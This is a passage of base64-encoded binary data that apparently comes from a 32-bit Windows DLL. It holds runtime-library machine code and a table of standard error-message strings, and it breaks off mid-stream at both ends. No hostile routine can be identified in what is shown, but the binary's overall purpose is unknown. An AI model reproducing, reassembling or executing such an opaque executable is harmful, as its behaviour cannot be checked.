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AAY29ubmVjdGlvbiByZXNldAAAAABkZXN0aW5hdGlvbiBhZGRyZXNzIHJlcXVpcmVkAAAAAGV4ZWN1dGFibGUgZm9ybWF0IGVycm9yAGZpbGUgdG9vIGxhcmdlAABob3N0IHVucmVhY2hhYmxlAAAAAGlkZW50aWZpZXIgcmVtb3ZlZAAAaWxsZWdhbCBieXRlIHNlcXVlbmNlAAAAaW5hcHByb3ByaWF0ZSBpbyBjb250cm9sIG9wZXJhdGlvbgAAaW52YWxpZCBzZWVrAAAAAGlzIGEgZGlyZWN0b3J5AABtZXNzYWdlIHNpemUAAAAAbmV0d29yayBkb3duAAAAAG5ldHdvcmsgcmVzZXQAAABuZXR3b3JrIHVucmVhY2hhYmxlAG5vIGJ1ZmZlciBzcGFjZQBubyBjaGlsZCBwcm9jZXNzAAAAAG5vIGxpbmsAbm8gbWVzc2FnZSBhdmFpbGFibGUAAAAAbm8gbWVzc2FnZQAAbm8gcHJvdG9jb2wgb3B0aW9uAABubyBzdHJlYW0gcmVzb3VyY2VzAG5vIHN1Y2ggZGV2aWNlIG9yIGFkZHJlc3MAAABubyBzdWNoIHByb2Nlc3MAbm90IGEgZGlyZWN0b3J5AG5vdCBhIHNvY2tldAAAAABub3QgYSBzdHJlYW0AAAAAbm90IGNvbm5lY3RlZAAAAG5vdCBzdXBwb3J0ZWQAAABvcGVyYXRpb24gaW4gcHJvZ3Jlc3MAAABvcGVyYXRpb24gbm90IHBlcm1pdHRlZABvcGVyYXRpb24gbm90IHN1cHBvcnRlZABvcGVyYXRpb24gd291bGQgYmxvY2sAAABvd25lciBkZWFkAABwcm90b2NvbCBlcnJvcgAAcHJvdG9jb2wgbm90IHN1cHBvcnRlZAAAcmVhZCBvbmx5IGZpbGUgc3lzdGVtAAAAcmVzb3VyY2UgZGVhZGxvY2sgd291bGQgb2NjdXIAAAByZXN1bHQgb3V0IG9mIHJhbmdlAHN0YXRlIG5vdCByZWNvdmVyYWJsZQAAAHN0cmVhbSB0aW1lb3V0AAB0ZXh0IGZpbGUgYnVzeQAAdGltZWQgb3V0AAAAdG9vIG1hbnkgZmlsZXMgb3BlbiBpbiBzeXN0ZW0AAAB0b28gbWFueSBsaW5rcwAAdG9vIG1hbnkgc3ltYm9saWMgbGluayBsZXZlbHMAAAB2YWx1ZSB0b28gbGFyZ2UAd3JvbmcgcHJvdG9jb2wgdHlwZQAAAAAABQAAAAgLARC3AAAAHAsBEBQAAAAoCwEQbwAAADgLARCqAAAATAsBEI4AAABMCwEQUgAAAAgLARDzAwAAZAsBEPQDAABkCwEQ9QMAAGQLARAQAAAACAsBEDcAAAAoCwEQZAkAAEwLARCRAAAAcAsBEAsBAACECwEQcAAAAJgLARBQAAAAHAsBEAIAAACsCwEQJwAAAJgLARAMAAAACAsBEA8AAAAoCwEQAQAAAMgLARAGAAAAhAsBEHsAAACECwEQIQAAAOALARDUAAAA4AsBEIMAAACECwEQ5gMAAAgLARAIAAAA9AsBEBUAAAAIDAEQEQAAACgMARBuAAAAZAsBEGEJAABMCwEQ4wMAADwMARAOAAAA9AsBEAMAAACsCwEQHgAAAGQLARDVBAAACAwBEBkAAABkCwEQIAAAAAgLARAEAAAAUAwBEB0AAABkCwEQEwAAAAgLARAdJwAAZAwBEEAnAAB4DAEQQScAAIgMARA/JwAAoAwBEDUnAADADAEQGScAAOAMARBFJwAA9AwBEE0nAAAIDQEQRicAABwNARA3JwAAMA0BEB4nAABQDQEQUScAAFwNARA0JwAAcA0BEBQnAACIDQEQJicAAJQNARBIJwAAqA0BECgnAAC8DQEQOCcAANANARBPJwAA4A0BEEInAAD0DQEQRCcAAAQOARBDJwAAFA4BEEcnAAAoDgEQOicAADgOARBJJwAATA4BEDYnAABcDgEQPScAAGwOARA7JwAAhA4BEDknAACcDgEQTCcAALAOARAzJwAAvA4BEAAAAAAAAAAAZgAAANQOARBkAAAA9A4BEGUAAACoAQEQcQAAAMABARAHAAAA1AEBECEAAADsAQEQDgAAAAQCARAJAAAAEAIBEGgAAAAkAgEQIAAAADACARBqAAAAPAIBEGcAAABQAgEQawAAAHACARBsAAAAhAIBEBIAAAAoDAEQbQAAAJgCARAQAAAATAsBECkAAABwCwEQCAAAALgCARARAAAAHAsBEBsAAADQAgEQJgAAADgLARAoAAAAyAsBEG4AAADgAgEQbwAAAPQCARAqAAAACAMBEBkAAAAgAwEQBAAAAIgNARAWAAAAhAsBEB0AAABEAwEQBQAAAGQLARAVAAAAVAMBEHMAAABkAwEQdAAAAHQDARB1AAAAhAMBEHYAAACUAwEQdwAAAKgDARAKAAAAuAMBEHkAAADMAwEQJwAAAOALARB4AAAA1AMBEHoAAADsAwEQewAAAPgDARAcAAAAmAsBEHwAAAAMBAEQBgAAACAEARATAAAAKAsBEAIAAACsCwEQAwAAADwEARAUAAAATAQBEIAAAABcBAEQfQAAAGwEARB+AAAAfAQBEAwAAAD0CwEQgQAAAIwEARBpAAAAPAwBEHAAAACcBAEQAQAAALQEARCCAAAAzAQBEIwAAADkBAEQhQAAAPwEARANAAAACAsBEIYAAAAIBQEQhwAAABgFARAeAAAAMAUBECQAAABIBQEQCwAAAAgMARAiAAAAaAUBEH8AAAB8BQEQiQAAAJQFARCLAAAApAUBEIoAAAC0BQEQFwAAAMAFARAYAAAAUAwBEB8AAADgBQEQcgAAAPAFARCEAAAAEAYBEIgAAAAgBgEQAAAAAAAAAABwZXJtaXNzaW9uIGRlbmllZAAAAGZpbGUgZXhpc3RzAG5vIHN1Y2ggZGV2aWNlAABmaWxlbmFtZSB0b28gbG9uZwAAAGRldmljZSBvciByZXNvdXJjZSBidXN5AGlvIGVycm9yAAAAAGRpcmVjdG9yeSBub3QgZW1wdHkAaW52YWxpZCBhcmd1bWVudAAAAABubyBzcGFjZSBvbiBkZXZpY2UAAG5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkAAABmdW5jdGlvbiBub3Qgc3VwcG9ydGVkAABubyBsb2NrIGF2YWlsYWJsZQAAAG5vdCBlbm91Z2ggbWVtb3J5AAAAcmVzb3VyY2UgdW5hdmFpbGFibGUgdHJ5IGFnYWluAABjcm9zcyBkZXZpY2UgbGluawAAAG9wZXJhdGlvbiBjYW5jZWxlZAAAdG9vIG1hbnkgZmlsZXMgb3BlbgBwZXJtaXNzaW9uX2RlbmllZAAAAGFkZHJlc3NfaW5fdXNlAABhZGRyZXNzX25vdF9hdmFpbGFibGUAAABhZGRyZXNzX2ZhbWlseV9ub3Rfc3VwcG9ydGVkAAAAAGNvbm5lY3Rpb25fYWxyZWFkeV9pbl9wcm9ncmVzcwAAYmFkX2ZpbGVfZGVzY3JpcHRvcgBjb25uZWN0aW9uX2Fib3J0ZWQAAGNvbm5lY3Rpb25fcmVmdXNlZAAAY29ubmVjdGlvbl9yZXNldAAAAABkZXN0aW5hdGlvbl9hZGRyZXNzX3JlcXVpcmVkAAAAAGJhZF9hZGRyZXNzAGhvc3RfdW5yZWFjaGFibGUAAAAAb3BlcmF0aW9uX2luX3Byb2dyZXNzAAAAaW50ZXJydXB0ZWQAaW52YWxpZF9hcmd1bWVudAAAAABhbHJlYWR5X2Nvbm5lY3RlZAAAAHRvb19tYW55X2ZpbGVzX29wZW4AbWVzc2FnZV9zaXplAAAAAGZpbGVuYW1lX3Rvb19sb25nAAAAbmV0d29ya19kb3duAAAAAG5ldHdvcmtfcmVzZXQAAABuZXR3b3JrX3VucmVhY2hhYmxlAG5vX